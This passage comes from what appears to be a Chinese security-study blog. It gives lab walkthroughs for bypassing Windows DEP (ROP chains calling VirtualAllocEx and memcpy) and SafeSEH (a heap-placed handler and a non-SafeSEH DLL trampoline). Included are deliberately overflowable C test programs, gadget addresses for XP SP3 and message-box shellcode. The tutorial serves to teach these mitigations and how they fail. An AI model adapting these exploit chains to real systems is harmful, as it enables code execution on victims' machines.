&quot;\\xBF\\x7D\\xC9\\x77&quot;//push esp jmp eax &amp;&amp; 原始 shellcode 起始地址 &quot;\\xFF\\x00\\x00\\x00&quot;//shellcode 长度 &quot;\\xAC\\xAF\\x94\\x7C&quot;//memcpy 函数切入点; &quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot; &quot;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53&quot; &quot;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B&quot; &quot;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95&quot; &quot;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59&quot; &quot;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A&quot; &quot;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75&quot; &quot;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03&quot; &quot;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB&quot; &quot;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50&quot; &quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8&quot; ; 运行结果，并没有弹出我们预想的 ”failwest“ 对话框。 因为memcpy 函数复制过来的不只是弹出对话框的机器码，还包含着弹出对话框机器码前面的一些指令和参数，而这些东西会破坏程序的执行。 最终 shellcode 如下所示。 1234567891011121314151617181920212223242526272829char shellcode[]= &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;……&quot; &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\xBA\\xD9\\xBB\\x7C&quot;//修正 EBP retn 4 &quot;\\xBC\\x45\\x82\\x7C&quot;//CALL VirtualAllocEx 地址 &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\xFF\\xFF\\xFF\\xFF&quot;//-1 当前进程 &quot;\\x00\\x00\\x03\\x00&quot;//申请空间起始地址 0x00030000 &quot;\\xFF\\x00\\x00\\x00&quot;//申请空间大小 0xFF &quot;\\x00\\x10\\x00\\x00&quot;//申请类型 0x1000 &quot;\\x40\\x00\\x00\\x00&quot;//申请空间访问类型 0x40 &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\x8A\\x17\\x84\\x7C&quot;//pop eax retn &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x0B\\x1A\\xBF\\x7C&quot;//pop pop retn &quot;\\xBA\\xD9\\xBB\\x7C&quot;//修正 EBP retn4 &quot;\\x5F\\x78\\xA6\\x7C&quot;//pop retn &quot;\\x00\\x00\\x03\\x00&quot;//可执行内存空间地址，转入执行用 &quot;\\x00\\x00\\x03\\x00&quot;//可执行内存空间地址，复制用 &quot;\\xBF\\x7D\\xC9\\x77&quot;//push esp jmp eax &amp;&amp; 原始 shellcode 起始地址 &quot;\\xFF\\x00\\x00\\x00&quot;//shellcode 长度 &quot;\\xAC\\xAF\\x94\\x7C&quot;//memcpy &quot;\\x00\\x00\\x03\\x00&quot;//一个可以读地址 &quot;\\x00\\x00\\x03\\x00&quot;//一个可以读地址 &quot;\\x00\\x90\\x90\\x94&quot; &quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot; &quot;……&quot; &quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8&quot;; 首先是对 ESI 和 EDI 指向内存的操作，在 0x00030004 和 0x00030005 分别对 ESI 和 EDI 指向的内存有读取操作，我们需要保证 ESI 和 EDI 指向合法的位置。 ESI 和 EDI 是在 memcpy 函数返回前被 POP 进去的。 接下来是 0x00030006 的 XCHG EAX,EBP 指令，这条指令直接破坏了 ESP，而在弹出对话框的机器码中有 PUSH 操作，所以 ESP 要修复，故我们在弹出对话框的机器码前边使用 0x94 填充，在 0x00030013 处来修复这个问题。 最后是 0x0003000F 的对[EAX]操作，如果 0x00030010 处使用 0x90 填充，结果就是对[EAX+0x909094FC]操作，这会引发异常，所以我们使用 0x00 填充 0x00030010，避免出现异常。 实际上我们有种更简单的方法来处理掉这些垃圾指令，从上图中大家可以看到我们弹出对话框的机器码起始地址为 0x00030008，我们可以让 memcpy 函数返回时直接跳转到这个位置，跃过前边的垃圾指令。 利用可执行内存挑战 DEP 有的时候在进程的内存空间中会存在一段可读可写可执行的内存，如果我们能够将 shellcode 复制到这段内存中，并劫持程序流程，我们的 shellcode 就有执行的机会。 这个实验与上一节的利用 VirtualAlloc 相似，只不过这次实验利用的是已经存在的可读可写可执行的内存空间，而上一节的实验是我们利用的是通过 VirtualAlloc() 函数创造的内存空间。所以这个实验与上一节实验基本相同，在此就不过多介绍。 源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;windows.h&gt;char shellcode[]= &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\x8A\\x17\\x84\\x7C&quot;//pop eax retn &quot;\\x0B\\x1A\\xBF\\x7C&quot;//pop pop retn &quot;\\xBA\\xD9\\xBB\\x7C&quot;//修正 EBP retn 4 &quot;\\x5F\\x78\\xA6\\x7C&quot;//pop retn &quot;\\x08\\x00\\x14\\x00&quot;//可执行内存中弹出对话框机器码的起始地址 &quot;\\x00\\x00\\x14\\x00&quot;//可执行内存空间地址，复制用 &quot;\\xBF\\x7D\\xC9\\x77&quot;//push esp jmp eax &amp;&amp; 原始 shellcode 起始地址 &quot;\\xFF\\x00\\x00\\x00&quot;//shellcode 长度 &quot;\\xAC\\xAF\\x94\\x7C&quot;//memcpy &quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot; &quot;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53&quot; &quot;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B&quot; &quot;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95&quot; &quot;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59&quot; &quot;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A&quot; &quot;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75&quot; &quot;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03&quot; &quot;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB&quot; &quot;\\x53\\x68\\x61\\x30\\x5F\\x5F\\x68\\x68\\x75\\x31\\x79\\x8B\\xC4\\x53\\x50\\x50&quot; &quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8&quot; ;void test()&#123; char tt[176]; memcpy(tt,shellcode,450);&#125;int main()&#123; HINSTANCE hInst = LoadLibrary(&quot;shell32.dll&quot;); char temp[200]; test(); return 0;&#125;","categories":[{"name":"0day安全","slug":"0day安全","permalink":"https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"DEP","slug":"DEP","permalink":"https://www.rgzzplus.com/tags/DEP/"}]},{"title":"亡羊补牢：SafeSEH","slug":"亡羊补牢：SafeSEH","date":"2022-06-09T11:31:34.000Z","updated":"2022-08-01T11:15:21.724Z","comments":true,"path":"2022/06/09/亡羊补牢：SafeSEH/","link":"","permalink":"https://www.rgzzplus.com/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/","excerpt":"","text":"[TOC] SafeSEH 对异常处理的保护原理 SafeSEH的原理 在程序调用异常处理函数前，对要调用的异常处理函数进行一系列的有效性校验，当发现异常处理函数不可靠时终止异常处理函数的调用。SafeSEH 需要操作系统和编译器的双重支持，二者缺一都会降低 SafeSEH 的保护能力。 编译器在SafeSEH 机制中所做的工作 启用/SafeSEH 链接选项后，编译器在编译程序的时候将程序所有的异常处理函数地址提取出来，编入一张安全 S.E.H 表，并将这张表放到程序的映像中。当程序调用异常处理函数的时候，会将函数地址与安全 S.E.H 表进行匹配，检查调用的异常处理函数是否位于安全 S.E.H 表中。 比较同一段代码在 VC++ 6. 0 （没有SafeSEH机制）和 VS 2008（有SafeSEH机制）分别编译后安全 S.E.H 表的区别。VS 2008 在编译程序时将程序中的异常处理函数的地址提取出来放到安全 S.E.H 表中。 操作系统在SafeSEH机制中的作用 通过前面（文章《形形色色的内存攻击技术》中）对S.E.H的的介绍，我们知道异常处理函数的调用是通过 RtlDispatchException()函数处理实现的，SafeSEH机制也是从这里开始的。 保护措施： （1）检查异常处理链是否位于当前程序的栈中，如下图所示。如果不在当前栈中，程序将终止异常处理函数的调用。 （2）检查异常处理函数的指针是否指向当前程序的栈中，如上图所示。如果指向当前栈中，程序将终止异常处理函数的调用。 （3）在前面两项检查都通过后，程序调用 RtlIsValidHandler()，来对异常处理函数的有效性进行验证。 RtlIsValidHandler() 都做了哪些工作呢？ 首先，该函数判断异常处理函数地址是不是在加载模块的内存空间，如果属于加载模块的内存空间，校验函数将依次进行如下校验。 （ 1）判断程序是否设置了 IMAGE_DLLCHARACTERISTICS_NO_SEH 标识。如果设置了这个标识，这个程序内的异常会被忽略，函数直接返回校验失败。 （ 2）检测程序是否包含安全 S.E.H 表。如果程序包含安全 S.E.H 表，则将当前的异常处理函数地址与该表进行匹配，匹配成功则返回校验成功，匹配失败则返回校验失败。 （ 3）判断程序是否设置 ILonly 标识。如果设置了这个标识，说明该程序只包含.NET 编译人中间语言，函数直接返回校验失败。 （ 4）判断异常处理函数地址是否位于不可执行页（ non-executable page）上。当异常处理函数地址位于不可执行页上时，校验函数将检测 DEP 是否开启，如果系统未开启 DEP 则返回校验成功，否则程序抛出访问违例的异常。 如果异常处理函数的地址没有包含在加载模块的内存空间，校验函数将直接进行 DEP 相关检测，函数依次进行如下校验。 （ 1）判断异常处理函数地址是否位于不可执行页（ non-executable page）上。当异常处理函数地址位于不可执行页上时，校验函数将检测 DEP 是否开启，如果系统未开启 DEP 则返回校验成功，否则程序抛出访问违例的异常。 （ 2）判断系统是否允许跳转到加载模块的内存空间外执行，如果允许则返回校验成功，否则返回校验失败。 RtlIsValidHandler()函数的伪代码如下所示： 1234567891011121314151617181920212223242526272829303132BOOL RtlIsValidHandler(handler)&#123; if (handler is in an image) &#123; //在加载模块内存空间内 if (image has the IMAGE_DLLCHARACTERISTICS_NO_SEH flag set) return FALSE; if (image has a SafeSEH table)&#123; //含有安全 S.E.H 表，说明程序启用 SafeSEH if (handler found in the table)//异常处理函数地址出现在安全 S.E.H 表中 return TRUE; else return FALSE; &#125; if (image is a .NET assembly with the ILonly flag set) //只包含 IL return FALSE; &#125; if (handler is on a non-executable page) &#123; //跑到不可执行页上了 if (ExecuteDispatchEnable bit set in the process flags) //DEP 关闭 return TRUE; else raise ACCESS_VIOLATION; //抛出访问违例异常 &#125; if (handler is not in an image) &#123; //在加载模块内存之外，并且在可执行页上 if (ImageDispatchEnable bit set in the process flags) //允许在加载模块内存空间外执行 return TRUE; else return FALSE; &#125; return TRUE; //前面条件都不满足的话只能允许这个异常处理函数执行了&#125; RtlIsValidHandler() 函数在哪些情况下允许异常处理函数执行？ （ 1）异常处理函数位于加载模块内存范围之外， DEP 关闭。 （ 2）异常处理函数位于加载模块内存范围之内，相应模块未启用 SafeSEH（安全 S.E.H 表为空），同时相应模块不是纯 IL。 （ 3）异常处理函数位于加载模块内存范围之内，相应模块启用 SafeSEH（安全 S.E.H 表不为空），异常处理函数地址包含在安全 S.E.H 表中。 我们来分析一下这三种情况攻击成功的可行性。 （ 1）现在我们只考虑 SafeSEH，不考虑 DEP，针对 DEP 的讨论我们放到下一节中。排除DEP 干扰后，我们只需在加载模块内存范围之外找到一个跳板指令就可以转入 shellcode 执行，这点还是比较容易实现的。 （ 2）在第二种情况中，我们可以利用未启用 SafeSEH 模块中的指令作为跳板， 转入 shellcode 执行，这也是为什么我们说 SafeSEH 需要操作系统与编译器的双重支持。在加载模块中找到一个未启用的 SafeSEH 模块也不是一件很困难的事情。 （ 3）这种情况下我们有两种思路可以考虑，一是清空安全 S.E.H 表，造成该模块未启用SafeSEH 的假象；二是将我们的指令注册到安全 S.E.H 表中。由于安全 S.E.H 表的信息在内存中是加密存放的，所以突破它的可能性也不大，这条路我们就先放弃吧。 通过以上分析可以得出结论：突破 SafeSEH 还是可以做到的。您可能会问这些方法貌似有点复杂，有没有更为简便的方法突破呢？很负责地告诉您，有两种更为简便直接方法可以突破 SafeSEH。 （ 1）不攻击 S.E.H（太邪恶了），可以考虑覆盖返回地址或者虚函数表等信息。 （ 2）利用 S.E.H 的终极特权！这种安全校验存在一个严重的缺陷——如果 S.E.H 中的异常函数指针指向堆区，即使安全校验发现了 S.E.H 已经不可信，仍然会调用其已被修改过的异常处理函数，因此只要将 shellcode 布置到堆区就可以直接跳转执行！ 请注意本节所有关于绕过 SafeSEH 机制的讨论均不考虑 DEP 的影响 攻击返回地址绕过 SafeSEH 如果碰到一个程序，他启用了 SafeSEH 但是未启用 GS，或者启用了 GS 但是刚好被攻击的函数没有 GS 保护（我们不考虑这种事情发生的概率，而且这种漏洞的的确确存在），攻击者肯定会直接攻击函数返回地址。实验请看《栈中的守护天使：GS》，这里不再重复介绍了。 利用虚函数绕过 SafeSEH 利用思路和我们在《栈中的守护天使：GS》中介绍的类似，通过攻击虚函数表来劫持程序流程，这个过程不涉及任何异常处理， SafeSEH 也就只是个摆设。在这我们就不做过多介绍了。 从堆中绕过 SafeSEH 演示如何利用堆绕过 SafeSEH。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include&lt;stdafx.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;char shellcode[]=&quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot;&quot;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53&quot;&quot;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B&quot;&quot;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95&quot;&quot;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59&quot;&quot;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A&quot;&quot;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75&quot;&quot;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03&quot;&quot;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB&quot;&quot;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50&quot;&quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\xF8\\x3D\\x39\\x00&quot;//address of shellcode in heap;//char shellcode[]=//&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;//&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;//&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;//&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;//&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;//&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;//&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;//&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;//&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;//&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;//&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;//&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;//;void test(char * input)&#123; char str[200]; strcpy(str,input); int zero=0; zero=1/zero;&#125;void main()&#123; char * buf=(char *)malloc(500); __asm int 3 strcpy(buf,shellcode); test(shellcode);&#125; 实验思路： （ 1）首先在堆中申请 500 字节的空间，用来存放 shellcode。 （ 2）函数 test 存在一个典型的溢出，通过向 str 复制超长字符串造成 str 溢出，进而覆盖程序的 S.E.H 信息。 （ 3）用 shellcode 在堆中的起始地址覆盖异常处理函数地址，然后通过制造除 0 异常，将程序转入异常处理，进而跳转到堆中的 shellcode 执行。 推荐使用的环境 备 注 操作系统 Window XP SP3 DEP 关闭 编译器 Visual Studio 2008 编译选项 禁用优化选项 build 版本 release 版本 说明： shellcode 中尾部的 0x00393DF8 为 shellcode 在堆中的起始地址，该地址可能在实验过程中需要重新设置。 首先将 shellcode 填充为多个 0x90，然后将程序用 VS2008 编译好后运行，由于我们再程序中加入了 int 3 指令，程序会自动中断，我们选择调试后系统会调用默认调试器进行调试，程序会自动停在 __asm int 3 处 。 如下图，程序中断前刚刚完成堆中空间申请，此时寄存器 EAX 中存放着申请空间的首地址 0x00393DF8，这个地址在不同机器上会有所不同。有了 shellcode的首地址，我们还需要确定shellcode需要填充多少字节才能淹没异常函数的地址。继续运行程序，中断在 test 函数中字符串复制结束时。 如下图所示，被溢出的字符串起始地址为 0x0012FE8C，S.E.H 异常处理函数指针位于 0x0012FFB0+4 的位置。所以我们使用 300 个字节就能覆盖掉异常处理函数指针。 布置 shellcode： 验证我们的分析是否正确。程序依然会被 INT 3 中断，等OllyDbg运行后 按Ctrl+G 跳转到 0x00393DF8 设置断点，然后按F9继续运行，可以看到程序在 0x00393DF8 处中断，说明我们已经成功绕过SafeSEH 转入 shellcode 执行。继续执行就会看到 failwest 对话框了。 利用未启用 SafeSEH 模块绕过 SafeSEH SafeSEH 对于未启用 SafeSEH 模块中的异常处理的校验过程：如果模块未启用 SafeSEH，并且该模块包含除中间语言（IL）之外的其它语言，这个异常处理就可以被执行。所以我们可以利用未启用 SafeSEH 的模块中的指令作为跳板来绕过 SafeSEH。 实验思路：构造一个不启用 SafeSEH 的 dll，然后将其加载，并通过它里面的指令作为跳板实现 SafeSEH 的绕过。 1234567891011121314//SEH_NOSafeSEH_JUMP.DLL#include&quot;stdafx.h&quot;BOOL APIENTRY DllMain( HANDLE hModule,DWORD ul_reason_for_call, LPVOID lpReserved)&#123; return TRUE;&#125;void jump()&#123; __asm&#123; pop eax pop eax retn &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162//SEH_NOSafeSEH.EXE#include &quot;stdafx.h&quot;#include &lt;string.h&gt;#include &lt;windows.h&gt;char shellcode[]=&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x12\\x10\\x12\\x11&quot;//address of pop pop retn in No_SafeSEH module&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot;&quot;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53&quot;&quot;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B&quot;&quot;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95&quot;&quot;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59&quot;&quot;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A&quot;&quot;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75&quot;&quot;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03&quot;&quot;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB&quot;&quot;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50&quot;&quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8&quot;;DWORD MyException(void)&#123; printf(&quot;There is an exception&quot;); getchar(); return 1;&#125;void test(char * input)&#123; char str[200]; strcpy(str,input); int zero=0; __try &#123; zero=1/zero; &#125; __except(MyException()) &#123; &#125;&#125;int _tmain(int argc, _TCHAR* argv[])&#123; HINSTANCE hInst = LoadLibrary(_T(&quot;SEH_NOSafeSEH_JUMP.dll&quot;));//load No_SafeSEH module char str[200]; __asm int 3 test(shellcode); return 0;&#125; 实验思路： （ 1）用 VC++ 6 .0 编译一个不使用 SafeSEH 的动态链接库 SEH_NOSafeSEH_JUMP.DLL，然后由启用 SafeSEH 的应用程序 SEH_NOSafeSEH.EXE 去加载它。 （ 2）SEH_NOSafeSEH 中的 test 函数通过向 str 复制超长字符串造成 str 溢出，进而覆盖程序的 S.E.H 信息。 （ 3）使用 SEH_NOSafeSEH_JUMP.DLL 中的“pop pop retn”指令地址覆盖异常处理函数地址，然后通过制造除 0 异常，让程序转入异常处理。通过劫持异常处理流程，程序转入SEH_NOSaeSEH_JUMP.DLL 中执行“pop pop retn” 指令，在执行 retn 后程序转入 shellcode 执行。 推荐使用的环境 备 注 操作系统 Window XP SP3 DEP 关闭 EXE 编译器 Visual Studio 2008 DLL 编译器 VC++ 6.0 将 dll 基址设置为 0x11120000 编译选项 禁用优化选项 build 版本 release 版本 说明：将 dll 基址设置为 0x11120000 是为了防止“ pop pop retn”指令地址中存在 0x00。 如果以 VC++ 6.0 的默认加载基址 0x10000000 为 DLL 的加载基址，DLL 中的 “pop pop retn” 指令地址可能会包含 0x00，这会导致我们在进行 strcpy 操作时会将字符串截断影响 shellcode 的复制。 注意：记得禁用优化选项，Project --&gt; Properties --&gt; Configuration Properties --&gt; C/C++ --&gt; Optimization --&gt; Optimization 选择 Disabled 